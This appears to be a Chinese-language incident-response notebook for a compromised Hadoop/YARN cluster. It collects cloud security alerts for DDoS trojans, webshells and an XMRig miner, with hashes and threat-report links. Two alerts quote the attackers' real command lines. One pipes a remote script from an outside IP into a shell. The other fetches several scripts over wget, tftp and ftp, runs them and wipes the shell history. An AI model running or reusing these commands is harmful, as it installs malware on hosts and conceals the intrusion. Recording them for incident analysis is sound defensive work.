# Rakitin

恶意软件-DDoS木马待处理
备注
该告警由如下引擎检测发现：
文件路径: /tmp/Rakitin.x86
恶意文件md5: 358cb1fc1fcb131360734354fb746cf9
进程id: 1469
描述: 黑客在入侵系统后植入的恶意程序，会占用您的带宽攻击其他服务器，同时可能影响自身业务的正常运行，危害较大。 此类恶意程序可能还存在自删除行为，或伪装成系统程序以躲避检测。如果发现该文件不存在，请检查是否存在可疑进程、定时任务或启动项。帮助文档：https://help.aliyun.com/knowledge_detail/36279.html


## 威胁报告

https://s.threatbook.cn/report/file/84304e5e94f703e9f6f32ea79a40f267042c72675a9aefe7ac8c1aebcec8f088/?sign=history&env=centos_7_x64

https://www.virustotal.com/gui/file/84304e5e94f703e9f6f32ea79a40f267042c72675a9aefe7ac8c1aebcec8f088

https://www.hybrid-analysis.com/sample/41d657a249975e80066e0359154a6c8d0642e28d4efa14de4e8cfe0188054839

https://analyze.intezer.com/files/84304e5e94f703e9f6f32ea79a40f267042c72675a9aefe7ac8c1aebcec8f088?vt


https://www.freebuf.com/articles/system/283726.html

https://www.freebuf.com/articles/system/262402.html

https://paper.seebug.org/611/

https://ti.qianxin.com/blog/articles/8220-mining-gang-in-china/

https://www.antiy.com/response/Mirai/Mirai.html


## 后门木马

后门木马又称特洛伊木马（Trojan Horse），是一种后门程序。后门木马具有很高的伪装性，通常表现为一个正常的应用程序或文件，以获得广泛的传播和目标用户的信任。当目标用户执行后门木马程序后，攻击者即可对用户的主机进行破坏或盗取敏感数据，如各种账户、密码、保密文件等。在黑客进行的各种攻击行为中，后门木马基本上都起到了先导作用，为进一步的攻击打下基础。

态势感知支持检测5种子类型的后门木马威胁，基础版不支持检测后门木马类威胁，标准版支持检测1种子类型威胁，专业版支持检测全部子类型威胁。

当检测到后门木马类威胁时，ECS实例存在木马程序网络请求，代表ECS实例已经存在被植入木马的特征，如尝试做wannacry勒索病毒相关DNS解析请求、尝试下载exe类木马程序等，属于“高危”告警级别威胁。因此建议按照如下方式处理：

https://www.freebuf.com/column/184932.html

## ELF文件格式

ELF (Executable and Linkable Format)是一种为可执行文件，目标文件，共享链接库和内核转储(core dumps)准备的标准文件格式。 Linux和很多类Unix操作系统都使用这个格式。 让我们来看一下64位ELF文件格式的结构以及内核源码中有关于它的一些定义。

一个ELF文件由以下三部分组成：

ELF头(ELF header) - 描述文件的主要特性：类型，CPU架构，入口地址，现有部分的大小和偏移等等；

程序头表(Program header table) - 列举了所有有效的段(segments)和他们的属性。 程序头表需要加载器将文件中的节加载到虚拟内存段中；

节头表(Section header table) - 包含对节(sections)的描述。

现在让我们对这些部分有一些更深的了解。

https://xinqiu.gitbooks.io/linux-inside-zh/content/Theory/linux-theory-2.html

## 后门的类型

https://www.cnblogs.com/zlgxzswjy/p/6209571.html


## Yarn需要开启Kerberos认证

https://s.tencent.com/research/report/1175.html

https://s.tencent.com/research/report/1093.html

# ldr

恶意脚本-恶意脚本代码执行待处理
备注
该告警由如下引擎检测发现：
命令行: /bin/bash -c (curl http://194.145.227.21/ldr.sh?f9edaad2||wget -q -O- http://194.145.227.21/ldr.sh?f9edaad2)|sh
进程PID: 3093
进程文件名: bash
父进程ID: 3090
父进程: bash
父进程文件路径: /usr/bin/bash
进程链:
-[1059]  /usr/bin/python2 /opt/cloudera/cm-agent/bin/../bin/supervisord -n
    -[19561]  /usr/bin/python2 /opt/cloudera/cm-agent/bin/cm proc_watcher 19588
        -[19588]  /usr/lib/jvm/jre-openjdk/bin/java -Dproc_nodemanager -Djava.net.preferIPv4Stack=true -Xms541065216 -Xmx541065216 -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=70 -XX:+CMSParallelRemarkEnabled -Dlibrary.leveldbjni.path=/var/run/cloudera-scm-agent/process/567-yarn-NODEMANAGER -Dhadoop.event.appender=,EventCatcher -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp/yarn_yarn-NODEMANAGER-6c773f43a0750daf6093d51f4d8a46e2_pid19588.hprof -XX:OnOutOfMemoryError=/opt/cloudera/cm-agent/service/common/killparent.sh -Dyarn.log.dir=/var/log/hadoop-yarn -Dyarn.log.file=hadoop-cmf-yarn-NODEMANAGER-cdh03.com.log.out -Dyarn.home.dir=/opt/cloudera/parcels/CDH-6.3.2-1.cdh6.3.2.p0.1605554/lib/hadoop-yarn -Dyarn.root.logger=INFO,RFA -Djava.library.path=/opt/cloudera/parcels/CDH-6.3.2-1.cdh6.3.2.p0.1605554/lib/hadoop/lib/native -Dhadoop.log.dir=/var/log/hadoop-yarn -Dhadoop.log.file=hadoop-cmf-yarn-NODEMANAGER-cdh03.com.log.out -Dhadoop.home.dir=/opt/cloudera/parcels/CDH-6.3.2-1.cdh6.3.2.p0.1605554/lib/hadoop -Dhadoop.id.str=yarn -Dhadoop.root.logger=INFO,RFA -Dhadoop.policy.file=hadoop-policy.xml -Dhadoop.security.logger=INFO,NullAppender org.apache.hadoop.yarn.server.nodemanager.NodeManager
            -[3090]  bash /yarn/nm/usercache/dr.who/appcache/application_1635840259220_0019/container_1635840259220_0019_01_000001/default_container_executor.sh

事件说明: 云安全中心检测到您的主机正在执行恶意的脚本代码(包括但不限于bash、powershell、python)，请立刻排查入侵来源。如果是您的运维行为，请选择忽略。

## 威胁报告

CoinMiner

https://s.threatbook.cn/report/file/7eb444671ab338eccadf81d43166661ccb4b1e487836ab41e2245db61dceed31/?sign=history&env=win7_sp1_enx86_office2013

## Nexus Repository Manager 3

https://s.tencent.com/research/report/1234.html

https://blog.csdn.net/qq_37912804/article/details/113036139

https://www.freebuf.com/vuls/272777.html

# webshell

网站后门-发现后门（Webshell）文件待处理
备注
该告警由如下引擎检测发现：
木马文件路径: /home/wwwroot/default/man.php
文件MD5: 0a7c0611df37d38929552667dbbc9e79
首次发现时间: 2021-05-12 16:45:24
更新时间: 2021-12-03 20:09:28
木马类型: Webshell
事件说明: 云安全中心在您的系统磁盘上发现了一个可疑文件，它可能代表了是黑客成功入侵网站后种植的，建议您先确认文件合法性并处理。总体上，云安全中心Webshell检测是根据文件行为威胁程度进行打分的，这个文件具备了一定的危险功能，本身具有一定的危险特征，但并不完全保证一定是一个网站后门，也可能是一些包含可疑代码的正常网站文件，如果管理员自己部署放置的，可以在前台选择忽略或者标记为误报按钮。同时，如果被告警的文件是一个.log网站日志文件，常常是因为网站将http日志直接明文保存在文件中，这样存在一定的安全风险。建议将http日志的保存路径放置到非web路径下。如果您确认是误报，可以通过【处理】->【加白】进行加白处理，加白后的路径将不会继续告警。


网站后门-发现后门（Webshell）文件待处理
备注
该告警由如下引擎检测发现：
木马文件路径: /home/wwwroot/default/appz.php
文件MD5: d4b164e1e8bbbb5351c6dacf6af96f9d
首次发现时间: 2021-05-12 16:54:56
更新时间: 2021-12-04 18:56:02
木马类型: Webshell
事件说明: 云安全中心在您的系统磁盘上发现了一个可疑文件，它可能代表了是黑客成功入侵网站后种植的，建议您先确认文件合法性并处理。总体上，云安全中心Webshell检测是根据文件行为威胁程度进行打分的，这个文件具备了一定的危险功能，本身具有一定的危险特征，但并不完全保证一定是一个网站后门，也可能是一些包含可疑代码的正常网站文件，如果管理员自己部署放置的，可以在前台选择忽略或者标记为误报按钮。同时，如果被告警的文件是一个.log网站日志文件，常常是因为网站将http日志直接明文保存在文件中，这样存在一定的安全风险。建议将http日志的保存路径放置到非web路径下。如果您确认是误报，可以通过【处理】->【加白】进行加白处理，加白后的路径将不会继续告警。

# gKAY DDos木马

恶意软件-DDoS木马待处理
备注
该告警由如下引擎检测发现：
文件路径: /tmp/gKAY
恶意文件md5: 0251dbeaf0033ec185a772a6810fe2dc
进程id: 6454
描述: 黑客在入侵系统后植入的恶意程序，会占用您的带宽攻击其他服务器，同时可能影响自身业务的正常运行，危害较大。 此类恶意程序可能还存在自删除行为，或伪装成系统程序以躲避检测。如果发现该文件不存在，请检查是否存在可疑进程、定时任务或启动项。帮助文档：https://help.aliyun.com/knowledge_detail/36279.html


## 分析报告

https://s.threatbook.cn/report/file/12355637741a7f2ddcd56d75892fc28a9c5f6d9bd4a210bd52077ba7d119a882/?sign=history&env=centos_7_x64




# 挖矿

恶意软件-挖矿程序待处理
备注
该告警由如下引擎检测发现：
文件路径: /data/dep/exchangis/myexchangis/wedatasphere-exchangis-0.5.0.RELEASE/modules/exchangis-eureka/conf/dysdtz/kthreaddk
恶意文件md5: 6db4f74c02570917e087c06ce32a99f5
检测方式: 云查杀
进程id: 4300
进程命令行: N/A
文件创建用户: yarn
文件创建时间: 2021-12-03 16:39:17
文件修改时间: 2021-12-03 16:39:17
样本家族与特征: Miner,XMRig
描述: 通常黑客入侵后会植入挖矿程序赚取收益，该类程序占用CPU等资源，影响用户正常业务，危害较大。且该程序可能还存在自删除行为，或伪装成系统程序以躲避检测。如果发现该文件不存在，请检查是否存在可疑进程、定时任务或启动项。具体详情可查看帮助：https://helpcdn.aliyun.com/knowledge_detail/41206.html



# fuze.sh

恶意脚本-恶意脚本代码执行待处理
备注
该告警由如下引擎检测发现：
命令行: wget http://185.177.57.45/fuze.sh
进程PID: 8607
进程文件名: wget
父进程ID: 8605
父进程: bash
父进程文件路径: /usr/bin/bash
进程链:
-[1059]  /usr/bin/python2 /opt/cloudera/cm-agent/bin/../bin/supervisord -n
    -[19561]  /usr/bin/python2 /opt/cloudera/cm-agent/bin/cm proc_watcher 19588
        -[19588]  /usr/lib/jvm/jre-openjdk/bin/java -Dproc_nodemanager -Djava.net.preferIPv4Stack=true -Xms541065216 -Xmx541065216 -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=70 -XX:+CMSParallelRemarkEnabled -Dlibrary.leveldbjni.path=/var/run/cloudera-scm-agent/process/567-yarn-NODEMANAGER -Dhadoop.event.appender=,EventCatcher -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp/yarn_yarn-NODEMANAGER-6c773f43a0750daf6093d51f4d8a46e2_pid19588.hprof -XX:OnOutOfMemoryError=/opt/cloudera/cm-agent/service/common/killparent.sh -Dyarn.log.dir=/var/log/hadoop-yarn -Dyarn.log.file=hadoop-cmf-yarn-NODEMANAGER-cdh03.com.log.out -Dyarn.home.dir=/opt/cloudera/parcels/CDH-6.3.2-1.cdh6.3.2.p0.1605554/lib/hadoop-yarn -Dyarn.root.logger=INFO,RFA -Djava.library.path=/opt/cloudera/parcels/CDH-6.3.2-1.cdh6.3.2.p0.1605554/lib/hadoop/lib/native -Dhadoop.log.dir=/var/log/hadoop-yarn -Dhadoop.log.file=hadoop-cmf-yarn-NODEMANAGER-cdh03.com.log.out -Dhadoop.home.dir=/opt/cloudera/parcels/CDH-6.3.2-1.cdh6.3.2.p0.1605554/lib/hadoop -Dhadoop.id.str=yarn -Dhadoop.root.logger=INFO,RFA -Dhadoop.policy.file=hadoop-policy.xml -Dhadoop.security.logger=INFO,NullAppender org.apache.hadoop.yarn.server.nodemanager.NodeManager
            -[8602]  bash /yarn/nm/usercache/dr.who/appcache/application_1635840259220_0020/container_1635840259220_0020_01_000001/default_container_executor.sh
                -[8605]  /bin/bash -c cd /tmp;wget http://185.177.57.45/fuze.sh; chmod 777 fuze.sh; sh fuze.sh; tftp 185.177.57.45 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.177.57.45; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.177.57.45 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh;clear;history -c; clear;history -w

事件说明: 云安全中心检测到您的主机正在执行恶意的脚本代码(包括但不限于bash、powershell、python)，请立刻排查入侵来源。如果是您的运维行为，请选择忽略。


## 威胁报告
fuze.sh

https://s.threatbook.cn/report/file/f61be2eb50cda564076e0f1bb70fb2484df60f0efd5066c34180824d83e64332/?sign=history&env=win7_sp1_enx86_office2013